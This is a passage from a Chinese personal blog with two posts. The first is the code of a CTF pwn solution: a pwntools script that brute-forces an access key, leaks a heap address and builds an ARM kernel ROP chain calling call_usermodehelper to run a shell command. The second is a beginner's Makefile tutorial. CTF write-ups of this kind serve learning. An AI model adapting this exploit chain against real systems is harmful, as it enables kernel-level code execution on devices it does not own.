pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span>    <span class="comment"># server(&quot;\x10&quot;,1,&#x27;b&#x27;)</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack+<span class="number">4</span>*<span class="number">20</span>),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80427e38</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">16</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    payload=str_change(payload,p32(call_usermodehelper),stack+<span class="number">4</span>*<span class="number">18</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80427e38 &lt;call_with_stack+32&gt;:	ldr	sp, [sp, #4]</span></span><br><span class="line"><span class="string">    0x80427e3c &lt;call_with_stack+36&gt;:	bx	lr</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对标志控制不严格导致的漏洞类型有了比较深刻的印象，了解学习了arm指令集以及寻找gadget的思路。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/08/makefile/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/08/makefile/" class="post-title-link" itemprop="url">makefile</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-08 17:15:57 / 修改时间：17:16:13" itemprop="dateCreated datePublished" datetime="2022-09-08T17:15:57+08:00">2022-09-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Makefile学习"><a href="#Makefile学习" class="headerlink" title="Makefile学习"></a>Makefile学习</h1><p>之前只是略有了解，感觉十分方便，所以想深入了解一下。</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Makefile是一个规则文件，make是一个程序，在命令行键入make后，make自动找见Makefile来解析其中的规则来完成编译工作。</p>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello-world"></a>hello-world</h2><p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220907185029578.png" alt="image-20220907185029578"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:</span><br><span class="line">	@echo &quot;hello world&quot;</span><br><span class="line">	@ls ./</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make</span><br><span class="line">hello world</span><br><span class="line">Makefile</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">a:</span></span><br><span class="line">	@echo <span class="string">&quot;hello world&quot;</span></span><br><span class="line">	@ls ./</span><br><span class="line">	gcc main.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	@rm -rf a.out</span><br><span class="line">	@echo <span class="string">&quot;a.out del success&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make</span><br><span class="line">hello world</span><br><span class="line">main.c	Makefile</span><br><span class="line">gcc main.c</span><br><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make clean</span><br><span class="line">a.out del success</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220907190203085.png" alt="image-20220907190203085"></p>
<h2 id="编译流程"><a href="#编译流程" class="headerlink" title="编译流程"></a>编译流程</h2><p>首先是把各个文件先编译成目标文件，然后再统一把目标文件进行链接，这样做的好处就是当修改了一个文件之后，在执行<code>make</code>并不会把所有文件全部再编译一次，而是只把改动的和改动相关的代码再编译一遍。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">calc:add.o sub.o multi.o</span><br><span class="line">	gcc add.o sub.o multi.o calc.cpp -o calc</span><br><span class="line"></span><br><span class="line">add.o:add.cpp</span><br><span class="line">	gcc -c add.cpp -o add.o</span><br><span class="line"></span><br><span class="line">sub.o:sub.cpp</span><br><span class="line">	gcc -c sub.cpp -o sub.o</span><br><span class="line"></span><br><span class="line">multi.o:multi.cpp</span><br><span class="line">	gcc -c multi.cpp -o multi.o</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220907194008573.png" alt="image-20220907194008573"></p>
<h2 id="变量使用"><a href="#变量使用" class="headerlink" title="变量使用"></a>变量使用</h2><p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220907195303414.png" alt="image-20220907195303414"></p>
<p>可以自定义变量，然后用$(变量名)来使用这个变量</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	gcc <span class="variable">$(OBJ)</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	gcc -c add.cpp -o add.o</span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	gcc -c sub.cpp -o sub.o</span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	gcc -c multi.cpp -o multi.o</span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	gcc -c calc.cpp -o calc.o</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o calc</span><br></pre></td></tr></table></figure>

<p>可以使用系统变量更加简化</p>
<p>$^就是所有不重复的依赖文件也就是<code>:</code>后面跟着的内容，$(TARGET)冒号后面是变量<code>OBJ</code>,所以是<code>add.o sub.o multi.o calc.o</code>,$@是目标文件的完整名称，也就是<code>$(TARGET)</code>,最后<code>gcc $^ -o $@</code>=<code>gcc add.o sub.o multi.o calc.o -o calc</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	gcc <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	gcc -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>然后还可以使用系统常量来完成跨平台的一些效果</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.o</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">add.o:add.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">sub.o:sub.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">multi.o:multi.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">calc.o:calc.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<h2 id="伪目标和模式匹配"><a href="#伪目标和模式匹配" class="headerlink" title="伪目标和模式匹配"></a>伪目标和模式匹配</h2><h3 id="伪目标"><a href="#伪目标" class="headerlink" title="伪目标"></a>伪目标</h3><p>按照我的理解，可能广义上来说目标就是指这个目标的命令执行后最后产生的文件名，一般<code>make clean</code>就是执行clean目标的命令，如果在当前目录下touch了一个clean文件，然后再执行<code>make clean</code>会发现没有执行命令，原因就是make认为clean文件就是目标，已经存在而且没有更新所以不需要执行命令了。</p>
<p>对于这种情况就得声明<code>clean</code>为伪目标了，所以可以看出当当前目标不生成对应文件，而是一种功能目标时就应该把他声明成伪目标。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220907201801523.png" alt="image-20220907201801523"></p>
<h3 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h3><p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220907204648885.png" alt="image-20220907204648885"></p>
<p>感觉这个规则还是很方便的，就拿上面的makefile来说，可以修改成下面的样子,makefile就缩短成几行的样子了，至于这条规则的原理，大概就是他会生成第一个目标也就是<code>$(TARGET):$(OBJ)</code>，然后发现<code>add.o sub.o multi.o calc.o</code>这些依赖文件都没有生成，然后就会去找生成这些文件的目标，首先是第一个<code>add.o</code>，<code>%.o:%.cpp</code>目标就能匹配，然后就会执行这个目标的命令，进而生成<code>add.o</code>,其他所有的目标文件也是这样生成，最后生成<code>calc</code>。</p>
<p>通过这个模式匹配，感觉makefile就是一层套一层，然后从最底层往上找，直到最底层的依赖全程都有了，再执行最底层的命令。有点递归那味了。</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OBJ=add.o sub.o multi.o calc.</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>这个makefile还可以利用<code>wildcard</code>和<code>patsubst</code>来增加makefile的泛用性</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#OBJ= sub.o multi.o calc.o add.o</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> %.cpp,%.o,$(<span class="built_in">wildcard</span> ./*.cpp)</span>)</span><br><span class="line">TARGET=calc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o <span class="variable">$(TARGET)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

